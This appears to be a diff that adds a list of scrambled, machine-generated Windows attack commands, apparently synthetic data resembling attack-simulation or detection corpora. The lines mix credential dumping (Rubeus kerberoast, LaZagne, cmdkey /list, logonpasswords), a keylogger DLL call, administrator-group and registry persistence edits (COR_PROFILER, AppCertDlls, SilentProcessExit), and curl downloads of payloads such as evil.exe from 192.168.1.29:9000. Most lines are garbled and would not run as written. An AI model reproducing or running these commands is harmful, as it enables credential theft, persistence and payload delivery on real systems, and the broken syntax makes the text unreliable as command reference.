@@ -1,0 +1,64 @@
+net localgroup inputprovider `` c : \users\
+net localgroup administrators `` '' '' /v cor_profiler '' ''
+rubeus.exe kerberoast windir volumn -accepteula bypassuac.exe
+silentrunner.exe $ : '' /v @ domain -name administrators '' /f
+quser
+rubeus.exe kerberoast cor_profiler_path -p $ { flag }
+for : powershell `` esentutl.exe c : loadappinit_dlls '' c : /v cor_profiler '' -name cor_profiler ''
+copy-item 1 `` domain admins '' /f
+net localgroup administrators `` $ `` domain } administrators
+net localgroup administrators `` `` hklm\system\currentcontrolset\control\session `` cor_profiler '' /f /grant administrators '' /grant `` cor_profiler '' c '' c '' file '' /t threadingmodel ''
+nmap -o -executionpolicy administrators ''
+net localgroup `` administrators '' /f /grant threadingmodel '' administrators
+adfind.exe -f administrators '' $ { ip
+net localgroup administrators `` `` hkey_local_machine\system\currentcontrolset\control\session manager\appcertdlls '' -name `` cor_profiler '' -name `` threadingmodel '' ''
+get-localgroup
+$ shortcut = `` set-wmiinstance file c http : set-wmiinstance -namespace -class __eventfilter -namespace `` cor_profiler '' dllname ''
+bitsadmin.exe /create `` $ `` c : cor_profiler = threadingmodel '' ''
+lazagne.exe windows
+copy c ( `` .\lazagne .. exe all
+netsh firewall set opmode
+schtasks /create
+reg `` kerberos : \windows\system32\spool\tools\printbrm.exe dir = $ : set-wmiinstance /grant new-object windir http \microsoft\teams\current\teams.exe
+dir -executionpolicy -verbose
+$ shortcut.windowstyle = 1 ;
+net localgroup `` administrators '' '' /t cor_profiler ''
+iediagcmd.exe /out -name `` $ address '' $ { file_name } }
+net localgroup administrators `` '' '' nt\currentversion\winlogon\notify\atomicredteam '' -name cor_profiler ''
+conhost.exe /fuzz c : windir % :logonpasswords -t $ target '' ;
+cmdkey /list
+net localgroup `` administrators '' /t cor_profiler ''
+get-ciminstance -classname win32_operatingsystem | select-object -excludeproperty enabled username )
+cmdkey.exe /list
+net user administrator /fullmemdmp in http : hklm\software\microsoft\windows \programdata\microsoft\windows\start -name hklm\system\currentcontrolset\control\session `` hkey_local_machine\system\currentcontrolset\control\session -r command= '' , http '' file -name cor_profiler '' threadingmodel
+rundll32 keylogger_dll.dll , keylog
+adfind.exe -f : foreach-object ( `` http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+quser
+$ shell = set-wmiinstance , http : \\ set-wmiinstance , http http : //192.168.1.29:9000/payload/evil.exe -o .\redirect.sdb
+iediagcmd.exe /out /f
+bitsadmin.exe /create $ `` administrators '' $ { user_name }
+net localgroup `` hklm\software\microsoft\windows '' file '' \users\
+set-executionpolicy -executionpolicy bypass
+rundll32 -name anything
+reg add `` domain c : nt\currentversion\silentprocessexit\svchost.exe '' /v '' cor_profiler ''
+quser
+remove-item -path $ wscriptshell.createshortcut domain }
+rubeus.exe dump
+tree
+icacls c : `` $ '' volumn you : \system\currentcontrolset\services\winsock2\parameters = \system32\osk.exe.bak
+net localgroup administrators `` cor_profiler '' /t /f
+psexec.exe \\ $ target = `` set-wmiinstance , cor_profiler = threadingmodel '' '' , threadingmodel ''
+systeminfo
+reg add `` hklm\system\currentcontrolset\control\session c : cor_profiler '' `` $ `` hklm\software\microsoft\windows \programdata\microsoft\windows\start file file sc.exe '' $ hklm\system\currentcontrolset\control\lsa\ volumn name minidump copy //192.168.1.29:9000/payload/redirect.sdb -o ; command= in = clearing cor_profiler '' '' , threadingmodel ''
+mkdir `` domain
+get-ciminstance http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net localgroup administrators `` defaultaccount full
+net localgroup `` administrators '' '' '' cor_profiler ''
+silentrunner.exe : `` '' \users\
+get-childitem -filter `` .\lazagne t1547.009 exe all
+curl http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+rdrleakdiag.exe /p domain admins = '' $ `` domain admins = `` cor_profiler '' '' , reg_multi_sz
+$ shortcut = `` http http '' //192.168.1.29:9000/payload/redirect.sdb -o ; wevtutil net.webclient \\ http http : \software\microsoft\command http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+powershell -ibck $ `` filename_regex }
+get-childitem -filter `` domain admins '' '' /user : @ cor_profiler = threadingmodel '' ''
+dumpminitool.exe -- , keylog
